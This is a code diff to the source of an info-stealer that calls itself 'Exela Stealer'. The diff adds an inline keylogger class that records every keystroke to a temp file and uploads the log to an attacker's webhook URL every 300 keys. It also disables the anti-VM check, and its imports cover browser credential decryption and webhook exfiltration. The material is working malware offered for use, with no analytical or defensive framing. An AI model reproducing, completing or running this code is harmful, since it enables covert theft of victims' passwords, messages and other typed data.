@@ -1,13 +1,13 @@
 import sqlite3, ctypes, mss, sys, ctypes, winreg, pygetwindow
 import os, wmi, win32api, platform, uuid, psutil, time, GPUtil
-import shutil, pythoncom, clipboard, keylogger.keylogger
+import shutil, pythoncom, clipboard
 from PIL import ImageGrab
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
 from Crypto.Cipher import AES
-
+from pynput import keyboard
 
 UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
-Anti_Vm = "%AnTiVm%"
+Anti_Vm = "false"
 wantS = "%StartuP%"
 methodxd = "%MethoD%"
 injectKeylogger = "%keyloggerinject???%"
@@ -671,7 +671,7 @@ class QuicaxdExela:
         embed.add_field(name="Total Download's",  inline=True,value=f"```{self.downloads}```")
         embed.add_field(name="Total History's",  inline=True,value=f"```{self.historys}```")
         if injectKeylogger == "%keyloggertrue%":
-            embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 50 keystrokes```")
+            embed.add_field(name="Inject Keylogger?", inline=True, value="```Yes, Keylogger logs will come after every 300 keystrokes```")
         else:
             embed.add_field(name="Inject Keylogger?", inline=True, value="```Nope```")
         embed.add_field(name="Exela Stealer is the best", inline=False, value=f"```{'just sex and money xd'}```")
@@ -1006,7 +1006,164 @@ class QuicaxdExela:
             if 5 > 4:
                 self.get_last_clipboard_text(run)
                 self.get_last_clipboard_image(run)
-            
+class KeyboardLogger:
+    def __init__(self, output_file, webhook_url) -> None:
+        self.output_file = output_file
+        self.caps_lock_active = False
+        self.total_keys = 0
+        self.webhook_url = webhook_url
+        self.running = True
+    def format_key(self, key):
+        if isinstance(key, keyboard.KeyCode):
+            return key.char if key.char else str(key.vk)
+        else:
+            return str(key)       
+    def on_key_press(self, key):
+        try:
+            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
+                if key == keyboard.Key.space:
+                    f.write(' ')
+                elif key == keyboard.Key.enter:
+                    f.write('\n')
+                elif key == keyboard.Key.caps_lock:
+                    self.caps_lock_active = not self.caps_lock_active
+                    if self.caps_lock_active:
+                        f.write('[caps_lock_on]')
+                    else:
+                        f.write('[caps_lock_off]')
+                elif key == keyboard.Key.f1:
+                    f.write('[F1]')
+                elif key == keyboard.Key.f2:
+                    f.write('[F2]')
+                elif key == keyboard.Key.f3:
+                    f.write('[F3]')
+                elif key == keyboard.Key.f4:
+                    f.write('[F4]')
+                elif key == keyboard.Key.f5:
+                    f.write('[F5]')
+                elif key == keyboard.Key.f6:
+                    f.write('[F6]')
+                elif key == keyboard.Key.f7:
+                    f.write('[F7]')
+                elif key == keyboard.Key.f8:
+                    f.write('[F8]')
+                elif key == keyboard.Key.f9:
+                    f.write('[F9]')
+                elif key == keyboard.Key.f10:
+                    f.write('[F10]')
+                elif key == keyboard.Key.f11:
+                    f.write('[F11]')
+                elif key == keyboard.Key.f12:
+                    f.write('[F12]')
+                elif key == keyboard.Key.home:
+                    f.write('[Home]')
+                elif key == keyboard.Key.end:
+                    f.write('[End]')
+                elif key == keyboard.Key.page_up:
+                    f.write('[PageUp]')
+                elif key == keyboard.Key.page_down:
+                    f.write('[PageDown]')
+                elif key == keyboard.Key.up:
+                    f.write(str('↑'))
+                elif key == keyboard.Key.down:
+                    f.write(str('↓'))
+                elif key == keyboard.Key.right:
+                    f.write(str('→'))
+                elif key == keyboard.Key.left:
+                    f.write(str('←'))
+                elif key == keyboard.Key.backspace:
+                    f.write("[back_space]")
+                elif key == keyboard.Key.esc:
+                    f.write("esc ")
+                else:
+                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
+                    f.write(f'{char}')
+                    self.total_keys += 1  
+                    if self.total_keys >= 300:
+                        self.send_webhook()
+        except AttributeError:
+            with open(self.output_file, 'a', encoding='utf-8', errors="ignore") as f:
+                if key == keyboard.Key.space:
+                    f.write(' ')
+                elif key == keyboard.Key.enter:
+                    f.write('\n')
+                elif key == keyboard.Key.caps_lock:
+                    self.caps_lock_active = not self.caps_lock_active
+                    if self.caps_lock_active:
+                        f.write('[caps_lock_on]')
+                    else:
+                        f.write('[caps_lock_off]')
+                elif key == keyboard.Key.f1:
+                    f.write('[F1]')
+                elif key == keyboard.Key.f2:
+                    f.write('[F2]')
+                elif key == keyboard.Key.f3:
+                    f.write('[F3]')
+                elif key == keyboard.Key.f4:
+                    f.write('[F4]')
+                elif key == keyboard.Key.f5:
+                    f.write('[F5]')
+                elif key == keyboard.Key.f6:
+                    f.write('[F6]')
+                elif key == keyboard.Key.f7:
+                    f.write('[F7]')
+                elif key == keyboard.Key.f8:
+                    f.write('[F8]')
+                elif key == keyboard.Key.f9:
+                    f.write('[F9]')
+                elif key == keyboard.Key.f10:
+                    f.write('[F10]')
+                elif key == keyboard.Key.f11:
+                    f.write('[F11]')
+                elif key == keyboard.Key.f12:
+                    f.write('[F12]')
+                elif key == keyboard.Key.home:
+                    f.write('[Home]')
+                elif key == keyboard.Key.end:
+                    f.write('[End]')
+                elif key == keyboard.Key.page_up:
+                    f.write('[PageUp]')
+                elif key == keyboard.Key.page_down:
+                    f.write('[PageDown]')
+                elif key == keyboard.Key.up:
+                    f.write(str('↑'))
+                elif key == keyboard.Key.down:
+                    f.write(str('↓'))
+                elif key == keyboard.Key.right:
+                    f.write(str('→'))
+                elif key == keyboard.Key.left:
+                    f.write(str('←'))
+                elif key == keyboard.Key.backspace:
+                    f.write("[back_space]")
+                elif key == keyboard.Key.esc:
+                    f.write("esc ")
+                else:
+                    char = self.format_key(key).upper() if self.caps_lock_active else self.format_key(key).lower()
+                    f.write(f'{char}')
+                    
+                    self.total_keys += 1  # Tuş sayısını artır
+
+                    # Kontrol ve gönderme işlemi
+                    if self.total_keys >= 300:
+                        self.send_webhook()
+    def send_webhook(self):
+        print("sendings")
+        if os.path.exists(self.output_file) and self.total_keys >= 300:
+            with open(self.output_file, 'r',encoding="utf-8", errors="ignore") as file:
+                payload = {
+                    'file': (self.output_file, file)
+                }
+                response = requests.post(self.webhook_url, files=payload)
+                if response.status_code == 200:
+                    print("log send succesfully.")
+                else:
+                    print("log cant send.")
+                self.total_keys = 0
+                with open(self.output_file, 'w',encoding="utf-8", errors="ignore") as file:
+                    file.write("") # clear logs
+    def start_logging(self):
+        with keyboard.Listener(on_press=self.on_key_press) as listener:
+            listener.join()
 class HardAntiVM:
     def __init__(self) -> None:
         if self.is_running_on_vm():
@@ -1199,7 +1356,10 @@ def injectKeyloggers():
         try:
             path = os.getenv('temp')
             outputFile = path + "\\key_logs.txt"
-            keylogger.keylogger.main(outputFile, UrLxD)
+            if os.path.isfile(outputFile):
+                os.remove(outputFile)
+            logger = KeyboardLogger(outputFile, UrLxD)
+            logger.start_logging()
         except Exception as e:
             print(str(e))
 
